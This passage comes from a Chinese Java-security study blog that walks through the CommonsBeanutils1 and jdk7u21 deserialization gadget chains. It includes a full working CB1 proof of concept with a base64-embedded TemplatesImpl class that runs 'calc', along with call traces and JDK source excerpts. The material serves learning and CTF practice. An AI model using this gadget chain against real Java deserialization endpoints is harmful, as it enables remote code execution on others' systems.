class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">        <span class="keyword">return</span> internalCompare( value1, value2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> IllegalAccessException iae ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> InvocationTargetException ite ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> NoSuchMethodException nsme ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="Gadget-CC2-XX-CC3"><a href="#Gadget-CC2-XX-CC3" class="headerlink" title="Gadget: CC2+XX+CC3"></a>Gadget: CC2+XX+CC3</h2><blockquote><p>核心思想是延续了CC2的PriorityQueue中readObject调用的compare()<br>使用到了CC2比较思想的衍生，但是脱离了CC库，虽然仍然需要Apache Commons这个依赖的，使用的是Apache Commons Beanutils</p></blockquote><ol><li><p><strong>Gadget</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java.util.PriorityQueue#readObejct()</span><br><span class="line">    java.util.PriorityQueue#heapify()</span><br><span class="line">        java.util.PriorityQueue#siftDown()</span><br><span class="line">            java.util.PriorityQueue#siftDownUsingComparator()   <span class="comment">// 上面和CC2一样</span></span><br><span class="line">                BeanComparator#compare()    <span class="comment">// 调用比较器的compare</span></span><br><span class="line">                    PropertyUtils#getProperty()</span><br><span class="line">                        TemplatesImpl#getOutputProperties() <span class="comment">// 下面的就和CC3一样，中间这部分是CB中的，可以连接两条半链</span></span><br><span class="line">                            TemplatesImpl#newTransformer()</span><br><span class="line">                                TemplatesImpl#getTransletInstance()</span><br><span class="line">                                    TemplatesImpl#defineTransletClasses()</span><br><span class="line">                                        TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure></li></ol><h2 id="CommonsBeanutils1-poc"><a href="#CommonsBeanutils1-poc" class="headerlink" title="CommonsBeanutils1 poc"></a>CommonsBeanutils1 poc</h2><ol><li>不顾细节，先直接构造一遍</li><li>条件<ol><li>直接传一个空的BeanComparator对象给PriorityQueue就好</li><li>payload重点在于放入PriorityQueue的内容</li></ol></li><li>最终poc<ol><li><em><strong>outputProperties注意开头的o要小写</strong></em></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CommonsBeanutils1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.compiler.Template;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.Pipe;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1_p</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/* * * * * * 1. 构造Templates Payload * * * * * */</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">payloadObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">payloadObj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            setFieldValue(payloadObj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;Base64.decode(</span><br><span class="line">                    <span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>)&#125;);</span><br><span class="line">            <span class="comment">// 直接Object[] &#123;payloadObj, payloadObj&#125;也是可以更加稳妥，不用这个payloadObj2</span></span><br><span class="line">            <span class="comment">// 这里_name只是为了设置看看H和A是否对顺序有什么影响</span></span><br><span class="line">            setFieldValue(payloadObj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">            setFieldValue(payloadObj2, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Z is the first one&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 设置触发器 * * * * * */</span></span><br><span class="line">            <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">            <span class="type">PriorityQueue</span> <span class="variable">triggerObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">            <span class="comment">// // 下面可以判断出PriorityQueue应该是一个最小堆，这里可以不用插入</span></span><br><span class="line">            <span class="comment">// triggerObj.add(2);</span></span><br><span class="line">            <span class="comment">// triggerObj.add(1);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 反射设置恶意代码 * * * * * */</span></span><br><span class="line">            setFieldValue(triggerObj,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;payloadObj2, payloadObj&#125;);</span><br><span class="line">            setFieldValue(triggerObj, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);   <span class="comment">// 需要进行设置，构造函数中只是初始容量</span></span><br><span class="line">            setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 4. 序列化与反序列化 * * * * * */</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">            oos.writeObject(triggerObj);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 本地测试触发</span></span><br><span class="line">            <span class="comment">// System.out.println(barr);</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Q-为什么反射设置new-Object-paylaodObj-payloadObj2-为不同的顺序仍然会触发"><a href="#Q-为什么反射设置new-Object-paylaodObj-payloadObj2-为不同的顺序仍然会触发" class="headerlink" title="Q: 为什么反射设置new Object[] {paylaodObj, payloadObj2}为不同的顺序仍然会触发"></a>Q: 为什么反射设置<code>new Object[] &#123;paylaodObj, payloadObj2&#125;</code>为不同的顺序仍然会触发</h2><blockquote><p>其实不用太纠结这种小细节，实战中的标准在于!!!保证触发!!! –&gt; 只要能触发就是好payload</p></blockquote><ol><li><p>明确一下目的，断点打在PriorityQueue的readObject()</p></li><li><p>进入发现不同顺序的话在<code>heapify()</code>之前都是按照我们设置的顺序来的，所以问题在之后</p></li><li><p>进入heapify()，推测报错时应该时触发，一直调到报错，进入函数，发现在比较时顺序也是按照设置的那样</p></li><li><p>A: 问题出在其实为不设置getOutputProperties()这里触发payload也不会报错，所以最终还是会到触发payload那里，也算是清晰了</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BeanComparator.java</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );    <span class="comment">// 这里是payloadOb2是也不会报错，会继续</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">    <span class="keyword">return</span> internalCompare( value1, value2 );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="Debug之法大也"><a href="#Debug之法大也" class="headerlink" title="Debug之法大也"></a>Debug之法大也</h2><ol><li>明确目的</li><li>先找到入口点，别一开始就太过精确死磕某个点，直接从外部包围内部<ol><li>比如这里调试先别一下到BeanComparator的<code>compare()</code>里，而是先到PriorityQueue的<code>readObject()</code>这里，<strong>跟着流走</strong></li></ol></li><li>不断明确在每一步中有哪里不对，这一步不清楚可以想想以前的</li><li>先宏观再整体，可以推测是否再报错时出现问题，如果时先找报错点进入，有时可以先跳过具体先看流后面来<strong>夹逼定位</strong></li><li>如果<strong>一直徘徊而且是不知道原因的</strong>，可以往前看，像这里的顺序问题，找到readObject那里就清晰了</li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>java安全漫谈</li><li>还是大佬</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(10)_jdk7u21</title>
      <link href="/2024/11/21/Java%E5%AE%89%E5%85%A85(10)_jdk7u21/"/>
      <url>/2024/11/21/Java%E5%AE%89%E5%85%A85(10)_jdk7u21/</url>
      
        <content type="html"><![CDATA[<h2 id="jdk7u21思想"><a href="#jdk7u21思想" class="headerlink" title="jdk7u21思想"></a>jdk7u21思想</h2><blockquote><p>还真是给我碰上了，没想法看了p牛关于jdk7u21这条链的讲解，发现和CC7都有涉及到hash这一部分的内容，难点刚好挺衔接的</p></blockquote><ol><li><strong>核心</strong>: 在于触发“动态方法执行”的地方，这是可以作为一个链接的触发点(范围比命令执行更大)甚至直接执行任意命令 –&gt; 我们的目的地<ol><li>CommonsCollections系列反序列化的核心点是那一堆 Transformer ，特别是其中的InvokerTransformer 、 InstantiateTransformer</li><li>CommonsBeanutils反序列化的核心点是 PropertyUtils#getProperty ，因为这个方法会触发任意对象的getter</li></ol></li><li>这里还是先上Gadget</li></ol><h2 id="Gadget-老朋友TemplatesImpl"><a href="#Gadget-老朋友TemplatesImpl" class="headerlink" title="Gadget: 老朋友TemplatesImpl"></a>Gadget: 老朋友TemplatesImpl</h2><blockquote><p>还是有TemplatesImpl链的身影，因为它很通用嘻嘻<br>看p牛的文章是也有一遍猜测这里的equals从哪来，也是想到的是Map和Set这里，也是学到一点感觉了</p></blockquote><ol><li>初步分析<ol><li><code>HashMap.put()</code>这里调用了equals，这里触发equal的条件是e.hash &#x3D;&#x3D; hash并且是一个对象不是普通值，后者容易前者得碰撞</li><li><code>InvocationHandler.invoke()</code>有一个方法名为equals，接受一个可以自定义的Object对象，其实就是找equals并传入一个TemplatesImpl对象了，用于调用后续的TemplatesImpl链子</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">    HashMap.put()</span><br><span class="line">        AnnotationInvocationHandler.invoke()    <span class="comment">// 这里通过代理进行调用</span></span><br><span class="line">            AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">                Method.invoke() <span class="comment">// 往下就是经典的TemplatesImpl链子</span></span><br><span class="line">                    TemplatesImpl.newTransformer()</span><br><span class="line">                        TemplatesImpl.getTransletInstance()</span><br><span class="line">                            TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                TransletClassLoader.defineClass()</span><br></pre></td></tr></table></figure><h2 id="AnnotationInvocationHandler-equalsImpl"><a href="#AnnotationInvocationHandler-equalsImpl" class="headerlink" title="AnnotationInvocationHandler.equalsImpl()"></a>AnnotationInvocationHandler.equalsImpl()</h2><ol><li><p>先看一波源码(.class): 将 this.type 类中的所有方法遍历并执行</p><ol><li><p>可以看到<code>var8 = var5.invoke(var1)</code>，是一个注入点</p></li><li><p>查看一下getMemberMethods()，获取所有方法(获取不限权限，但是调用有权限限制)</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Method[] getMemberMethods() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.memberMethods == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.memberMethods = (Method[])AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Method[] run() &#123;</span><br><span class="line">                Method[] var1 = AnnotationInvocationHandler.<span class="built_in">this</span>.type.getDeclaredMethods();</span><br><span class="line">                AccessibleObject.setAccessible(var1, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> var1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.memberMethods;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>需要到达到这一步的条件？</p><ol><li>this.type是var1的实例(子类)</li><li>this.memberMethods设置为null，会在第一次调用时获取所有方法</li><li>传入的var1并不Proxy对象(进入到函数里看)，应该是我们的恶意TemplatesImpl对象，对于的接口就是Templates.class中刚好有我们的目标(<strong>这里做了简化不使用TemplatesImpl</strong>)</li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Templates.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Templates</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    Transformer <span class="title function_">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    Properties <span class="title function_">getOutputProperties</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Boolean <span class="title function_">equalsImpl</span><span class="params">(Object var1)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Method[] var2 = <span class="built_in">this</span>.getMemberMethods();</span><br><span class="line">        <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> var2.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">var5</span> <span class="operator">=</span> var2[var4];</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getName();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var6);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">AnnotationInvocationHandler</span> <span class="variable">var9</span> <span class="operator">=</span> <span class="built_in">this</span>.asOneOfUs(var1);</span><br><span class="line">            <span class="keyword">if</span> (var9 != <span class="literal">null</span>) &#123;</span><br><span class="line">                var8 = var9.memberValues.get(var6);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var8 = var5.invoke(var1);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(var12);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="AnnotationInvocationHandler-invoke"><a href="#AnnotationInvocationHandler-invoke" class="headerlink" title="AnnotationInvocationHandler.invoke()"></a>AnnotationInvocationHandler.invoke()</h2><ol><li><p>下一步就是寻找到调用equalsImpl()的函数了，搜一下这不就来了</p></li><li><p>AnnotationInvocationHandler.invoke()</p><ol><li>只需要调用一个被代理的equals方法并且传入是一个对象类型的参数即可</li><li>这一个代理又type需要进行设置，这里直接Templates.class就好，刚好可以调用到<code>newTransformer()</code>，还有</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AnnotationInvocationHandler.java</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">assert</span> var5.length == <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;annotationType&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">            <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(<span class="built_in">this</span>.type, var4);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span 